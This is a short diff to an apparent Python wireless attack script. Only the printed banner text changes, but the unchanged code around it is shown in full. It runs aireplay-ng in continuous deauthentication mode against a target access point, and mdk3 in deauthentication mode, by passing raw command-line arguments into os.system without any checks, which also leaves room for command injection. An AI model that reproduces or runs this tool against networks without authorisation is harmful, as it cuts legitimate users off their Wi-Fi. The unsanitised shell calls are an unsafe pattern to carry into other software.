@@ -49,7 +49,7 @@ def start():
    if(sys.argv[1] == "-q"):#Quiet attack
       if(sys.argv[2] == "--a"):
          mode="aireplay-ng "
-         print("############################# Quiet: "+mode+" mode#############################")
+         print("############################# Quiet: "+mode+" attack #############################")
          os.system("airodump-ng "+str(sys.argv[4])+"")
          #os.system("airmon-ng start "+str(sys.argv[5])+" "+str(sys.argv[8])+"")
          os.system(""+mode+"-0 0 -a "+str(sys.argv[6])+" "+str(sys.argv[4])+"")
@@ -57,7 +57,7 @@ def start():
          
       if(sys.argv[2] == "--m"):
          mode="mdk3 "
-         print("############################# Quiet: "+mode+" mode#############################")
+         print("############################# Quiet: "+mode+" attack #############################")
          os.system(""+mode+str(sys.argv[4])+" d -n"+str(sys.argv[6])+"")
       
       
